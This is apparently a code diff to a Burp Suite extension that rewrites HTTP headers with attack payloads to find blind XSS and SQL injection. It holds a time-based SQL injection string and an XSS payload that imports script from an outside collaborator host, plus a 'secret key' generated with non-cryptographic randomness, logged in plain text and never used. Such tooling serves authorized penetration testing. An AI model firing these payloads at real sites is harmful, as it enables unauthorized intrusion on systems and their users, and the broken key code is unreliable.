@@ -31,6 +31,8 @@ import burp.api.montoya.scanner.scancheck.PassiveScanCheck;
 import burp.api.montoya.scanner.scancheck.ScanCheckType;
 import burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;
 import burp.api.montoya.scanner.audit.issues.AuditIssue;
+import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
+import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;
 import burp.api.montoya.http.Http;
 
 import static burp.api.montoya.scanner.AuditResult.auditResult;
@@ -68,6 +70,7 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     private CollaboratorClient collaboratorClient;
     private ScheduledExecutorService scheduler;
     private String collaboratorServerLocation;
+    private String collaboratorSecretKey;
     
     // Settings
     private boolean extensionActive = true;
@@ -79,7 +82,7 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     private List<String> headers = new ArrayList<>();
     private List<String> sensitiveHeaders = new ArrayList<>();
     private String sqliPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
-    private String bxssPayload = "Mozilla\"><img/src/onerror=import('//collaborator.oastify.com')>"; // Generic template
+    private String bxssPayload = "Mozilla\"><img/src/onerror=import('//{{collaborator}}')>"; // Use {{collaborator}} placeholder
     private List<String> skipHosts = new ArrayList<>();
     private List<String> injectedHeaders = new ArrayList<>();
     private List<String> extraHeaders = new ArrayList<>();
@@ -91,17 +94,19 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     // Request timing tracking
     private final Map<String, Long> requestTimestamps = new ConcurrentHashMap<>();
     
-    // Payload correlation tracking
-    private final Map<String, PayloadContext> payloadMap = new ConcurrentHashMap<>();
+    // Efficient payload correlation tracking
+    private final Map<String, PayloadCorrelation> payloadMap = new ConcurrentHashMap<>();
 
-    private static class PayloadContext {
-        final HttpRequest originalRequest;
+    private static class PayloadCorrelation {
+        final String requestUrl;
         final String headerName;
+        final String requestMethod;
         final long timestamp;
 
-        PayloadContext(HttpRequest originalRequest, String headerName) {
-            this.originalRequest = originalRequest;
+        PayloadCorrelation(String requestUrl, String headerName, String requestMethod) {
+            this.requestUrl = requestUrl;
             this.headerName = headerName;
+            this.requestMethod = requestMethod;
             this.timestamp = System.currentTimeMillis();
         }
     }
@@ -135,8 +140,10 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     public void initialize(MontoyaApi api) {
         this.api = api;
         this.persistedObject = api.persistence().extensionData();
-        this.collaboratorClient = api.collaborator().createClient();
-        this.collaboratorServerLocation = this.collaboratorClient.generatePayload().toString().split("\\.", 2)[1];
+        
+        // Initialize collaborator client with secret key
+        initializeCollaboratorClient();
+        
         this.scheduler = Executors.newScheduledThreadPool(2);
         
         // Set extension name
@@ -166,6 +173,37 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
         startCollaboratorPolling();
         
         api.logging().logToOutput("Header Banger v" + VERSION + " loaded successfully");
+    }
+
+    private void initializeCollaboratorClient() {
+        // Get or generate secret key for persistence and identification
+        this.collaboratorSecretKey = persistedObject.getString("collaboratorSecretKey");
+        if (this.collaboratorSecretKey == null || this.collaboratorSecretKey.isEmpty()) {
+            // Generate a new secret key for this extension instance
+            this.collaboratorSecretKey = generateSecretKey();
+            persistedObject.setString("collaboratorSecretKey", this.collaboratorSecretKey);
+            api.logging().logToOutput("Generated new collaborator secret key: " + this.collaboratorSecretKey);
+        }
+        
+        // Create collaborator client (standard API without secret key)
+        this.collaboratorClient = api.collaborator().createClient();
+        this.collaboratorServerLocation = this.collaboratorClient.generatePayload().toString().split("\\.", 2)[1];
+        
+        api.logging().logToOutput("Collaborator client initialized with secret key stored in persistence");
+    }
+    
+    private String generateSecretKey() {
+        // Generate a secure random secret key
+        final String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        final int keyLength = 32;
+        Random random = new Random();
+        StringBuilder key = new StringBuilder();
+        
+        for (int i = 0; i < keyLength; i++) {
+            key.append(chars.charAt(random.nextInt(chars.length())));
+        }
+        
+        return key.toString();
     }
 
     private void loadSettings() {
@@ -324,21 +362,22 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
                 for (Interaction interaction : interactions) {
                     String interactionDomain = findDomainInInteraction(interaction);
                     if (interactionDomain != null) {
-                        PayloadContext context = payloadMap.get(interactionDomain);
-                        if (context != null) {
+                        PayloadCorrelation correlation = payloadMap.get(interactionDomain);
+                        if (correlation != null) {
                             api.logging().logToOutput("🚀 SUCCESSFUL XSS DETECTED! 🚀");
                             api.logging().logToOutput("═══════════════════════════════════════════════════════════");
                             
                             // Log detailed interaction information
                             api.logging().logToOutput("📋 Interaction Details:");
-                            api.logging().logToOutput("  • URL: " + context.originalRequest.url());
-                            api.logging().logToOutput("  • Header: " + context.headerName);
+                            api.logging().logToOutput("  • URL: " + correlation.requestUrl);
+                            api.logging().logToOutput("  • Method: " + correlation.requestMethod);
+                            api.logging().logToOutput("  • Header: " + correlation.headerName);
                             api.logging().logToOutput("  • Time: " + new java.util.Date());
                             
                             api.logging().logToOutput("═══════════════════════════════════════════════════════════");
                             
                             // Create XSS issue
-                            createXssIssue(interaction, context);
+                            createXssIssue(interaction, correlation);
                             
                             // Clean up the map
                             payloadMap.remove(interactionDomain);
@@ -360,13 +399,22 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     private String findDomainInInteraction(Interaction interaction) {
         String collaboratorHost = this.collaboratorServerLocation;
         
+        // Check HTTP interactions
         Optional<String> domainFromHttp = interaction.httpDetails()
-                .map(http -> http.requestReceived().httpService().host());
+                .map(http -> {
+                    // Extract domain from the interaction ID or URL
+                    String interactionId = interaction.id().toString();
+                    if (interactionId.endsWith("." + collaboratorHost)) {
+                        return interactionId;
+                    }
+                    return null;
+                });
                 
-        if (domainFromHttp.isPresent() && domainFromHttp.get().endsWith(collaboratorHost)) {
+        if (domainFromHttp.isPresent() && domainFromHttp.get() != null) {
             return domainFromHttp.get();
         }
         
+        // Check DNS interactions
         Optional<String> domainFromDns = interaction.dnsDetails()
                 .map(DnsDetails::query)
                 .map(ByteArray::toString);
@@ -376,21 +424,72 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
             return dnsQuery.substring(0, dnsQuery.length() - 1); // remove trailing dot
         }
 
+        // Fallback: extract domain from interaction ID
+        String interactionId = interaction.id().toString();
+        if (interactionId.endsWith("." + collaboratorHost)) {
+            return interactionId;
+        }
+
         return null;
     }
 
-    private void createXssIssue(Interaction interaction, PayloadContext context) {
+    private void createXssIssue(Interaction interaction, PayloadCorrelation correlation) {
         // Enhanced XSS issue creation with more context
         api.logging().logToOutput("💥 XSS VULNERABILITY CONFIRMED!");
-        api.logging().logToOutput("🎯 Attack Vector: Header injection via " + context.headerName);
-        api.logging().logToOutput("  • URL: " + context.originalRequest.url());
+        api.logging().logToOutput("🎯 Attack Vector: Header injection via " + correlation.headerName);
+        api.logging().logToOutput("  • URL: " + correlation.requestUrl);
+        api.logging().logToOutput("  • Method: " + correlation.requestMethod);
         api.logging().logToOutput("⚡ Impact: Cross-Site Scripting (XSS) execution detected");
         api.logging().logToOutput("🕐 Detected: " + new java.util.Date());
         api.logging().logToOutput("📊 Interaction ID: " + interaction.id());
         
-        // TODO: Create proper Burp issue in future versions
-        api.logging().logToOutput("📝 Note: This will be converted to a proper Burp issue in future versions");
+        // Create proper Burp audit issue
+        try {
+            createAuditIssue(
+                "Header Injection XSS via " + correlation.headerName,
+                "Cross-Site Scripting (XSS) vulnerability detected through header injection in the " 
+                + correlation.headerName + " header. The payload was successfully executed as confirmed by "
+                + "collaborator interaction " + interaction.id() + ". This allows attackers to inject arbitrary "
+                + "JavaScript code that will be executed in the context of other users' browsers.",
+                correlation.requestUrl,
+                AuditIssueSeverity.HIGH,
+                AuditIssueConfidence.CERTAIN
+            );
+        } catch (Exception e) {
+            api.logging().logToError("Failed to create audit issue: " + e.getMessage());
+        }
+        
         api.logging().logToOutput("───────────────────────────────────────────────────────────");
+    }
+    
+    private void createAuditIssue(String issueName, String issueDetail, String requestUrl, 
+                                  AuditIssueSeverity severity, AuditIssueConfidence confidence) {
+        try {
+            // Create a simple HTTP request for the issue
+            HttpRequest issueRequest = HttpRequest.httpRequestFromUrl(requestUrl);
+            HttpRequestResponse issueRequestResponse = api.http().sendRequest(issueRequest);
+            
+            // Build the audit issue
+            AuditIssue issue = AuditIssue.auditIssue(
+                issueName,
+                issueDetail,
+                null, // remediation - can be null
+                requestUrl,
+                severity,
+                confidence,
+                null, // background - can be null
+                null, // remediation background - can be null
+                severity, // issue severity (not confidence)
+                issueRequestResponse // evidence (request/response)
+            );
+            
+            // Add the issue to Burp's issue list
+            api.siteMap().add(issue);
+            
+            api.logging().logToOutput("✅ Audit issue created successfully: " + issueName);
+        } catch (Exception e) {
+            api.logging().logToError("Failed to create audit issue: " + e.getMessage());
+        }
     }
     
     private String getCurrentAttackHeaders() {
@@ -574,17 +673,17 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
 
             String finalPayload;
             if ("User-Agent".equalsIgnoreCase(headerName)) {
-                finalPayload = bxssPayload.replace("collaborator.oastify.com", payloadDomain);
+                finalPayload = bxssPayload.replace("{{collaborator}}", payloadDomain);
             } else if ("Referer".equalsIgnoreCase(headerName)) {
                 String originalReferer = request.headerValue("Referer");
                 if (originalReferer == null) originalReferer = request.url();
-                finalPayload = originalReferer + bxssPayload.replace("Mozilla", "").replace("collaborator.oastify.com", payloadDomain);
+                finalPayload = originalReferer + bxssPayload.replace("Mozilla", "").replace("{{collaborator}}", payloadDomain);
             } else {
-                finalPayload = "1" + bxssPayload.replace("Mozilla", "").replace("collaborator.oastify.com", payloadDomain);
+                finalPayload = "1" + bxssPayload.replace("Mozilla", "").replace("{{collaborator}}", payloadDomain);
             }
 
-            // Create and store context
-            payloadMap.put(payloadDomain, new PayloadContext(request, headerName));
+            // Create and store correlation
+            payloadMap.put(payloadDomain, new PayloadCorrelation(request.url(), headerName, request.method()));
 
             // Overwrite header
             boolean headerFoundAndReplaced = false;
@@ -647,9 +746,9 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
             for (String sensitiveHeader : sensitiveHeaders) {
                 CollaboratorPayload collabPayload = collaboratorClient.generatePayload();
                 String payloadDomain = collabPayload.toString();
-                String finalPayload = hostValue + bxssPayload.replace("Mozilla", "").replace("collaborator.oastify.com", payloadDomain);
+                String finalPayload = hostValue + bxssPayload.replace("Mozilla", "").replace("{{collaborator}}", payloadDomain);
                 headersToUpdate.add(HttpHeader.httpHeader(sensitiveHeader, finalPayload));
-                payloadMap.put(payloadDomain, new PayloadContext(originalRequest, sensitiveHeader));
+                payloadMap.put(payloadDomain, new PayloadCorrelation(originalRequest.url(), sensitiveHeader, originalRequest.method()));
             }
             HttpRequest modifiedRequest = originalRequest.withUpdatedHeaders(addOrReplaceHeaders(originalRequest.headers(), extraHeaders));
             
@@ -755,9 +854,9 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
                         for (String sensitiveHeader : sensitiveHeaders) {
                             CollaboratorPayload collabPayload = collaboratorClient.generatePayload();
                             String payloadDomain = collabPayload.toString();
-                            String finalPayload = hostValue + bxssPayload.replace("Mozilla", "").replace("collaborator.oastify.com", payloadDomain);
+                            String finalPayload = hostValue + bxssPayload.replace("Mozilla", "").replace("{{collaborator}}", payloadDomain);
                             headersToUpdate.add(HttpHeader.httpHeader(sensitiveHeader, finalPayload));
-                            payloadMap.put(payloadDomain, new PayloadContext(originalRequest, sensitiveHeader));
+                            payloadMap.put(payloadDomain, new PayloadCorrelation(originalRequest.url(), sensitiveHeader, originalRequest.method()));
                         }
                         HttpRequest modifiedRequest = originalRequest.withUpdatedHeaders(addOrReplaceHeaders(originalRequest.headers(), extraHeaders));
                         List<HttpHeader> finalHeaders = new ArrayList<>(modifiedRequest.headers());
